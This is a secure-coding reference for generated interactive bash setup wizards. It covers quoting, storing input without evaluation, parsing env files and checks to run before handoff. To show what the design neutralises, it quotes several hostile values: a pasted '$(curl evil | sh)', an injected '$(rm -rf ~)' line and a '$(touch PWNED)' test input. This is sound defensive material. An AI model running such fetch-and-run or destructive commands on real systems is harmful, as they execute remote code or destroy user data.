# Bash Wizard Safety

The generated script runs on a human's machine, with their credentials, and
reads text they paste from web dashboards. This reference documents the safety
properties the generator guarantees, why each exists, and how to verify them
before handing a wizard over.

## Threat model in one table

| Source of text | Trusted? | How it reaches bash | Guarantee |
|----------------|----------|---------------------|-----------|
| Spec strings (titles, instructions, URLs, rollback) | Author-controlled, but may contain quotes, `$`, backticks | Emitted as single-quoted literals | Never expanded or executed |
| Spec check commands | Author-controlled code | Passed as one literal to `bash -c` | Runs exactly as written; reviewed like any script |
| Human input (pasted values) | **Untrusted** | `read -r` into a local, then `printf -v NAME` | Never evaluated, never word-split, never used as a pattern |
| Env file on resume | Written by the wizard, editable by the human | Parsed line by line; only declared names are assigned | Never `source`d |

The one rule behind all of it: **data stays data.** Nothing a human types is
ever placed where bash would interpret it.

## Generator guarantees

### 1. Strict mode

Every script starts with `set -euo pipefail`:

- `-e` stops on the first failing command instead of carrying on into the next
  step with half the state.
- `-u` turns a misspelled variable into an error instead of an empty string
  (an empty `$NEW_LB_IP` in a DNS check would otherwise match nothing and fail
  confusingly, or worse, match everything).
- `pipefail` makes `dig ... | grep -q ...` fail when `dig` fails.

Checks run inside `if bash -c ...`, so a failing check is handled by the
retry/abort prompt rather than killing the script.

### 2. Single-quote everything from the spec

The generator's quoting function wraps every spec string in single quotes and
rewrites embedded `'` as `'"'"'`. Inside single quotes bash performs no
expansion at all: `$(...)`, backticks, `$VAR`, `!`, globs and backslashes are
all literal. That is why a title like `Rotate "prod" key's $SECRET` renders
verbatim. Double quotes would not be safe: they still expand `$` and backticks.

### 3. Human input is stored, never evaluated

```bash
IFS= read -r value           # -r: backslashes stay literal; IFS=: keep spaces
printf -v "$name" '%s' "$value"
export "${name?}"
```

- `printf -v` assigns without evaluation. `eval "$name=$value"` would execute a
  pasted `$(curl evil | sh)`; `declare "$name=$value"` has edge cases with
  array syntax. `name` itself comes from the spec and is validated as
  `^[A-Z][A-Z0-9_]+$` and against reserved names (`PATH`, `IFS`, `BASH_*`,
  `LD_*`, `WIZARD_*`, ...), so a spec cannot redirect the assignment into
  something that changes how the shell behaves.
- Secret inputs use `read -s` (no echo) and are never printed, logged, or put
  on a command line where `ps` could show them.

### 4. Validation uses ERE in a variable

```bash
[[ "$value" =~ $pattern ]]
```

The pattern is in a variable and unquoted on the right-hand side: this is the
documented way to get regex (not literal) matching. The value is quoted. The
pattern comes from the spec, never from the human. Patterns must be POSIX ERE;
the validator rejects `\d`, `\w`, `\s`, `\b`, lookarounds and non-greedy
quantifiers because their behaviour varies between platforms' regex libraries.

### 5. Env-file writes without sed

A `sed -i "s/^NAME=.*/NAME=$value/"` upsert breaks on `/`, `&` and newlines in
the value, and an attacker-shaped value can inject sed commands. The runtime
instead:

1. Creates a temp file next to the target with `mktemp`, `chmod 600` first.
2. Copies every line except `NAME=...` with `grep -v` (the pattern is built
   from the validated name only).
3. Appends `NAME=value` with `printf '%s=%s\n'`.
4. Renames the temp file over the target (atomic on the same filesystem).

Values are written raw (`KEY=value`), which every common dotenv loader reads.
`read -r` reads one line, so a value can never contain a newline that would
inject a second key.

### 6. Env-file reads without source

On resume the runtime parses the env file line by line, splits on the first
`=`, and assigns only names listed in the wizard's declared variables. A line
like `PATH=/tmp/evil` or `$(rm -rf ~)` added to the file by hand is ignored.

### 7. Refuse non-interactive stdin

If stdin is not a TTY, the wizard exits with an error unless
`WIZARD_ALLOW_NONINTERACTIVE=1` is set. This stops CI jobs or agents from
"running the wizard" by piping `yes` into it, which would sail through every
pause and confirmation. Set the variable only in tests.

EOF on stdin aborts with a message instead of looping on empty reads.

### 8. State and logs without values

`.wizard-state/` is created with mode 700. The `.done` file holds step ids
only; the `.log` file holds timestamps and event names (`confirmed cutover-dns`,
`skipped-check ...`), never values.

### 9. Interrupt handling

`Ctrl-C` prints "progress is saved" and exits 130. Steps are marked done only
after their checks pass, so an interrupted step simply repeats.

## Pre-handoff verification

The agent cannot run the wizard end to end (it waits for a human), so verify
it statically and with a scripted dry run:

1. **Validate the spec** with the validator in `--strict` mode.
2. **Generate.** The generator runs `bash -n` on its output and exits 1 if
   the syntax check fails.
3. **ShellCheck** if installed: `shellcheck -S warning wizard.sh`. The runtime
   is written to pass at warning level.
4. **Scripted run in a scratch directory** with a copy of the spec whose
   checks are replaced by local commands (`test -n "$VAR"`), feeding answers
   on stdin:

   ```bash
   printf '%s\n' 'value-one' 'abc' 'step-id' '' | \
     WIZARD_ALLOW_NONINTERACTIVE=1 WIZARD_STATE_DIR=./state bash wizard.sh
   ```

   Include one hostile value such as `$(touch PWNED)` and confirm no `PWNED`
   file appears and the env file holds the literal text.
5. **Trace the data flow:** every captured value lands where the spec says,
   every value a later check or the application needs is stored, nothing secret
   is stored with `store: none` and then needed again.

## Things the generator deliberately does not do

- **No automatic browser launch** unless `WIZARD_OPEN_URLS=1`. Opening tabs on
  someone's machine without asking is surprising, and on a remote shell it
  fails noisily.
- **No writes outside the working directory.** `env_file` must be relative and
  may not contain `..`.
- **No network calls of its own.** Only the spec's check commands reach out, and
  those are visible in the spec and the script.
- **No sudo.** If a step needs root, the instruction tells the human to run the
  command themselves; the wizard never escalates.

## Reviewing a generated wizard (checklist)

- [ ] `set -euo pipefail` is the first executable line
- [ ] Every `w_say`, `w_header`, `w_open_url` argument is single-quoted
- [ ] No `eval`, `source`, `.` or backtick anywhere outside comments
- [ ] Every check expands captured values inside double quotes
- [ ] Irreversible steps call `w_confirm_irreversible` before their instructions
- [ ] The env file path is in `.gitignore`
